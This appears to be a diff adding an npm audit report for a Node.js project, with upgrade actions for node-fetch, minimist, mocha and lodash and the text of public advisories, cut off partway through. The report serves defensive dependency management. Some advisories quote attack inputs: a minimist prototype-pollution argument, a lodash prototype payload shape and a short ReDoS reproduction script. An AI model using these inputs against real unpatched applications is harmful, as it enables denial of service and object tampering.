@@ -1,0 +1,1075 @@
+{
+  "actions": [
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1095073,
+          "path": "node-fetch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1098225,
+          "path": "node-fetch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "node-fetch",
+      "target": "3.3.2"
+    },
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1096466,
+          "path": "minimist",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1097677,
+          "path": "minimist",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "minimist",
+      "target": "1.2.8"
+    },
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1096466,
+          "path": "mocha>mkdirp>minimist",
+          "dev": true,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1097677,
+          "path": "mocha>mkdirp>minimist",
+          "dev": true,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112703,
+          "path": "mocha>diff",
+          "dev": true,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "mocha",
+      "target": "12.0.3"
+    },
+    {
+      "isMajor": false,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1106913,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106914,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106918,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106920,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108258,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108261,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115806,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115810,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120370,
+          "path": "lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash",
+      "target": "4.18.1"
+    },
+    {
+      "action": "review",
+      "module": "request",
+      "resolves": [
+        {
+          "id": 1096727,
+          "path": "request",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tough-cookie",
+      "resolves": [
+        {
+          "id": 1097682,
+          "path": "request>tough-cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "form-data",
+      "resolves": [
+        {
+          "id": 1109540,
+          "path": "request>form-data",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120745,
+          "path": "request>form-data",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "qs",
+      "resolves": [
+        {
+          "id": 1113719,
+          "path": "request>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "request>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": "request>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1095073": {
+      "findings": [
+        {
+          "version": "2.6.0",
+          "paths": [
+            "node-fetch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2022-0235\n- https://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10\n- https://huntr.dev/bounties/d26ab655-38d6-48b3-be15-f9ad6b6ae6f7\n- https://github.com/node-fetch/node-fetch/pull/1453\n- https://github.com/node-fetch/node-fetch/commit/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\n- https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\n- https://lists.debian.org/debian-lts-announce/2022/12/msg00007.html\n- https://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60\n- https://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35\n- https://github.com/advisories/GHSA-r683-j2x4-v87g",
+      "created": "2022-01-21T23:55:52.000Z",
+      "id": 1095073,
+      "npm_advisory_id": null,
+      "overview": "node-fetch forwards secure headers such as `authorization`, `www-authenticate`, `cookie`, & `cookie2` when redirecting to a untrusted site.",
+      "reported_by": null,
+      "title": "node-fetch forwards secure headers to untrusted sites",
+      "metadata": null,
+      "cves": [
+        "CVE-2022-0235"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "node-fetch",
+      "vulnerable_versions": "<2.6.7",
+      "github_advisory_id": "GHSA-r683-j2x4-v87g",
+      "recommendation": "Upgrade to version 2.6.7 or later",
+      "patched_versions": ">=2.6.7",
+      "updated": "2023-11-29T22:08:39.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-173",
+        "CWE-200",
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-r683-j2x4-v87g"
+    },
+    "1096466": {
+      "findings": [
+        {
+          "version": "0.0.8",
+          "paths": [
+            "minimist",
+            "mocha>mkdirp>minimist"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2020-7598\n- https://snyk.io/vuln/SNYK-JS-MINIMIST-559764\n- http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00024.html\n- https://www.npmjs.com/advisories/1179\n- https://github.com/minimistjs/minimist/commit/10bd4cdf49d9686d48214be9d579a9cdfda37c68\n- https://github.com/minimistjs/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab\n- https://github.com/minimistjs/minimist/commit/4cf1354839cb972e38496d35e12f806eea92c11f#diff-a1e0ee62c91705696ddb71aa30ad4f95\n- https://github.com/minimistjs/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94\n- https://github.com/advisories/GHSA-vh95-rmgr-6w4m",
+      "created": "2020-04-03T21:48:32.000Z",
+      "id": 1096466,
+      "npm_advisory_id": null,
+      "overview": "Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  \nThis is exploitable if attackers have control over the arguments being passed to `minimist`.\n\n\n## Recommendation\n\nUpgrade to versions 0.2.1, 1.2.3 or later.",
+      "reported_by": null,
+      "title": "Prototype Pollution in minimist",
+      "metadata": null,
+      "cves": [
+        "CVE-2020-7598"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "minimist",
+      "vulnerable_versions": "<0.2.1",
+      "github_advisory_id": "GHSA-vh95-rmgr-6w4m",
+      "recommendation": "Upgrade to version 0.2.1 or later",
+      "patched_versions": ">=0.2.1",
+      "updated": "2024-02-13T20:00:55.000Z",
+      "cvss": {
+        "score": 5.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-vh95-rmgr-6w4m"
+    },
+    "1096727": {
+      "findings": [
+        {
+          "version": "2.88.2",
+          "paths": [
+            "request"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-28155\n- https://github.com/request/request/issues/3442\n- https://github.com/request/request/pull/3444\n- https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf\n- https://github.com/github/advisory-database/pull/2500\n- https://github.com/cypress-io/request/blob/master/lib/redirect.js#L116\n- https://github.com/request/request/blob/master/lib/redirect.js#L111\n- https://github.com/cypress-io/request/pull/28\n- https://github.com/cypress-io/request/commit/c5bcf21d40fb61feaff21a0e5a2b3934a440024f\n- https://github.com/cypress-io/request/releases/tag/v3.0.0\n- https://security.netapp.com/advisory/ntap-20230413-0007\n- https://github.com/advisories/GHSA-p8p7-x288-28g6",
+      "created": "2023-03-16T15:30:19.000Z",
+      "id": 1096727,
+      "npm_advisory_id": null,
+      "overview": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
+      "reported_by": null,
+      "title": "Server-Side Request Forgery in Request",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-28155"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "request",
+      "vulnerable_versions": "<=2.88.2",
+      "github_advisory_id": "GHSA-p8p7-x288-28g6",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2024-03-21T17:47:21.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-p8p7-x288-28g6"
+    },
+    "1097677": {
+      "findings": [
+        {
+          "version": "0.0.8",
+          "paths": [
+            "minimist",
+            "mocha>mkdirp>minimist"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2021-44906\n- https://github.com/substack/minimist/issues/164\n- https://github.com/substack/minimist/blob/master/index.js#L69\n- https://snyk.io/vuln/SNYK-JS-MINIMIST-559764\n- https://stackoverflow.com/questions/8588563/adding-custom-properties-to-a-function/20278068#20278068\n- https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip\n- https://github.com/minimistjs/minimist/issues/11\n- https://github.com/minimistjs/minimist/pull/24\n- https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703\n- https://github.com/minimistjs/minimist/commit/bc8ecee43875261f4f17eb20b1243d3ed15e70eb\n- https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d\n- https://github.com/minimistjs/minimist/commit/ef9153fc52b6cea0744b2239921c5dcae4697f11\n- https://github.com/minimistjs/minimist/commits/v0.2.4\n- https://security.netapp.com/advisory/ntap-20240621-0006\n- https://github.com/advisories/GHSA-xvch-5gv4-984h",
+      "created": "2022-03-18T00:01:09.000Z",
+      "id": 1097677,
+      "npm_advisory_id": null,
+      "overview": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
+      "reported_by": null,
+      "title": "Prototype Pollution in minimist",
+      "metadata": null,
+      "cves": [
+        "CVE-2021-44906"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "minimist",
+      "vulnerable_versions": "<0.2.4",
+      "github_advisory_id": "GHSA-xvch-5gv4-984h",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2024-06-21T21:33:52.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xvch-5gv4-984h"
+    },
+    "1097682": {
+      "findings": [
+        {
+          "version": "2.5.0",
+          "paths": [
+            "request>tough-cookie"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-26136\n- https://github.com/salesforce/tough-cookie/issues/282\n- https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e\n- https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3\n- https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873\n- https://lists.debian.org/debian-lts-announce/2023/07/msg00010.html\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3HUE6ZR5SL73KHL7XUPAOEL6SB7HUDT2\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ\n- https://security.netapp.com/advisory/ntap-20240621-0006\n- https://github.com/advisories/GHSA-72xf-g2v4-qvf3",
+      "created": "2023-07-01T06:30:16.000Z",
+      "id": 1097682,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
+      "reported_by": null,
+      "title": "tough-cookie Prototype Pollution vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-26136"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tough-cookie",
+      "vulnerable_versions": "<4.1.3",
+      "github_advisory_id": "GHSA-72xf-g2v4-qvf3",
+      "recommendation": "Upgrade to version 4.1.3 or later",
+      "patched_versions": ">=4.1.3",
+      "updated": "2024-06-21T21:33:53.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-72xf-g2v4-qvf3"
+    },
+    "1098225": {
+      "findings": [
+        {
+          "version": "2.6.0",
+          "paths": [
+            "node-fetch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/node-fetch/node-fetch/security/advisories/GHSA-w7rc-rwvf-8q5r\n- https://nvd.nist.gov/vuln/detail/CVE-2020-15168\n- https://github.com/node-fetch/node-fetch/commit/2358a6c2563d1730a0cdaccc197c611949f6a334\n- https://github.com/node-fetch/node-fetch/commit/eaff0094c4dfdd5b78711a8c4f1b61e33d282072\n- https://github.com/advisories/GHSA-w7rc-rwvf-8q5r",
+      "created": "2020-09-10T17:46:21.000Z",
+      "id": 1098225,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nNode Fetch did not honor the `size` option after following a redirect, which means that when a content size was over the limit, a `FetchError` would never get thrown and the process would end without failure.\n\nFor most people, this fix will have a little or no impact. However, if you are relying on node-fetch to gate files above a size, the impact could be significant, for example: If you don't double-check the size of the data after `fetch()` has completed, your JS thread could get tied up doing work on a large file (DoS) and/or cost you money in computing.\n\n### Patches\nWe released patched versions for both stable and beta channels:\n\n- For `v2`: 2.6.1\n- For `v3`: 3.0.0-beta.9\n\n### Workarounds\nNone, it is strongly recommended to update as soon as possible.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [node-fetch](https://github.com/node-fetch/node-fetch/issues/new?assignees=&labels=question&template=support-or-usage.md&title=Question%3A+)\n* Contact one of the core maintainers.",
+      "reported_by": null,
+      "title": "The `size` option isn't honored after following a redirect in node-fetch",
+      "metadata": null,
+      "cves": [
+        "CVE-2020-15168"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "node-fetch",
+      "vulnerable_versions": ">=2.0.0 <2.6.1",
+      "github_advisory_id": "GHSA-w7rc-rwvf-8q5r",
+      "recommendation": "Upgrade to version 2.6.1 or later",
+      "patched_versions": ">=2.6.1",
+      "updated": "2024-07-15T19:46:23.000Z",
+      "cvss": {
+        "score": 2.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-w7rc-rwvf-8q5r"
+    },
+    "1106913": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2021-23337\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://snyk.io/vuln/SNYK-JS-LODASH-1040724\n- https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851\n- https://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074932\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074930\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074928\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074931\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074929\n- https://www.oracle.com//security-alerts/cpujul2021.html\n- https://www.oracle.com/security-alerts/cpuoct2021.html\n- https://www.oracle.com/security-alerts/cpujan2022.html\n- https://www.oracle.com/security-alerts/cpujul2022.html\n- https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\n- https://security.netapp.com/advisory/ntap-20210312-0006\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2021-23337.yml\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
+      "created": "2021-05-06T16:05:51.000Z",
+      "id": 1106913,
+      "npm_advisory_id": null,
+      "overview": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+      "reported_by": null,
+      "title": "Command Injection in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2021-23337"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": "<4.17.21",
+      "github_advisory_id": "GHSA-35jh-r3h4-6jhm",
+      "recommendation": "Upgrade to version 4.17.21 or later",
+      "patched_versions": ">=4.17.21",
+      "updated": "2025-08-12T21:44:25.000Z",
+      "cvss": {
+        "score": 7.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-77",
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-35jh-r3h4-6jhm"
+    },
+    "1106914": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2018-16487\n- https://hackerone.com/reports/380873\n- https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad\n- https://security.netapp.com/advisory/ntap-20190919-0004\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml\n- https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+      "created": "2019-02-07T18:16:48.000Z",
+      "id": 1106914,
+      "npm_advisory_id": null,
+      "overview": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+      "reported_by": null,
+      "title": "Prototype Pollution in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2018-16487"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": "<4.17.11",
+      "github_advisory_id": "GHSA-4xc9-xhrj-v574",
+      "recommendation": "Upgrade to version 4.17.11 or later",
+      "patched_versions": ">=4.17.11",
+      "updated": "2025-08-12T21:36:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+    },
+    "1106918": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/pull/4336\n- https://nvd.nist.gov/vuln/detail/CVE-2019-10744\n- https://snyk.io/vuln/SNYK-JS-LODASH-450202\n- https://access.redhat.com/errata/RHSA-2019:3024\n- https://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\n- https://www.oracle.com/security-alerts/cpujan2021.html\n- https://www.oracle.com/security-alerts/cpuoct2020.html\n- https://support.f5.com/csp/article/K47105354?utm_source=f5support&amp%3Butm_medium=RSS\n- https://security.netapp.com/advisory/ntap-20191004-0005\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2019-10744.yml\n- https://github.com/advisories/GHSA-jf85-cpcp-j695",
+      "created": "2019-07-10T19:45:23.000Z",
+      "id": 1106918,
+      "npm_advisory_id": null,
+      "overview": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
+      "reported_by": null,
+      "title": "Prototype Pollution in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2019-10744"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "lodash",
+      "vulnerable_versions": "<4.17.12",
+      "github_advisory_id": "GHSA-jf85-cpcp-j695",
+      "recommendation": "Upgrade to version 4.17.12 or later",
+      "patched_versions": ">=4.17.12",
+      "updated": "2025-08-12T21:43:02.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-jf85-cpcp-j695"
+    },
+    "1106920": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/issues/4744\n- https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12\n- https://nvd.nist.gov/vuln/detail/CVE-2020-8203\n- https://hackerone.com/reports/712065\n- https://github.com/lodash/lodash/issues/4874\n- https://github.com/github/advisory-database/pull/2884\n- https://hackerone.com/reports/864701\n- https://github.com/lodash/lodash/wiki/Changelog#v41719\n- https://web.archive.org/web/20210914001339/https://github.com/lodash/lodash/issues/4744\n- https://security.netapp.com/advisory/ntap-20200724-0006\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2020-8203.yml\n- https://github.com/advisories/GHSA-p6mc-m468-83gw",
+      "created": "2020-07-15T19:15:48.000Z",
+      "id": 1106920,
+      "npm_advisory_id": null,
+      "overview": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
+      "reported_by": null,
+      "title": "Prototype Pollution in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2020-8203"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=3.7.0 <4.17.19",
+      "github_advisory_id": "GHSA-p6mc-m468-83gw",
+      "recommendation": "Upgrade to version 4.17.19 or later",
+      "patched_versions": ">=4.17.19",
+      "updated": "2025-08-12T21:43:40.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-770",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-p6mc-m468-83gw"
+    },
+    "1108258": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2020-28500\n- https://github.com/lodash/lodash/pull/5065\n- https://github.com/lodash/lodash/pull/5065/commits/02906b8191d3c100c193fe6f7b27d1c40f200bb7\n- https://github.com/lodash/lodash/blob/npm/trimEnd.js%23L8\n- https://snyk.io/vuln/SNYK-JS-LODASH-1018905\n- https://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074896\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074894\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074892\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074895\n- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074893\n- https://www.oracle.com//security-alerts/cpujul2021.html\n- https://www.oracle.com/security-alerts/cpuoct2021.html\n- https://www.oracle.com/security-alerts/cpujan2022.html\n- https://www.oracle.com/security-alerts/cpujul2022.html\n- https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\n- https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a\n- https://security.netapp.com/advisory/ntap-20210312-0006\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2020-28500.yml\n- https://github.com/github/advisory-database/pull/6139\n- https://github.com/advisories/GHSA-29mw-wpgm-hmr9",
+      "created": "2022-01-06T20:30:46.000Z",
+      "id": 1108258,
+      "npm_advisory_id": null,
+      "overview": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+      "reported_by": null,
+      "title": "Regular Expression Denial of Service (ReDoS) in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2020-28500"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <4.17.21",
+      "github_advisory_id": "GHSA-29mw-wpgm-hmr9",
+      "recommendation": "Upgrade to version 4.17.21 or later",
+      "patched_versions": ">=4.17.21",
+      "updated": "2025-09-29T20:19:46.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-29mw-wpgm-hmr9"
+    },
+    "1108261": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2019-1010266\n- https://github.com/lodash/lodash/issues/3359\n- https://snyk.io/vuln/SNYK-JS-LODASH-73639\n- https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347\n- https://github.com/lodash/lodash/wiki/Changelog\n- https://security.netapp.com/advisory/ntap-20190919-0004\n- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2019-1010266.yml\n- https://github.com/github/advisory-database/pull/6138\n- https://github.com/advisories/GHSA-x5rq-j2xg-h7qm",
+      "created": "2019-07-19T16:13:07.000Z",
+      "id": 1108261,
+      "npm_advisory_id": null,
+      "overview": "lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.",
+      "reported_by": null,
+      "title": "Regular Expression Denial of Service (ReDoS) in lodash",
+      "metadata": null,
+      "cves": [
+        "CVE-2019-1010266"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.7.0 <4.17.11",
+      "github_advisory_id": "GHSA-x5rq-j2xg-h7qm",
+      "recommendation": "Upgrade to version 4.17.11 or later",
+      "patched_versions": ">=4.17.11",
+      "updated": "2025-09-29T20:19:29.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5rq-j2xg-h7qm"
+    },
+    "1109540": {
+      "findings": [
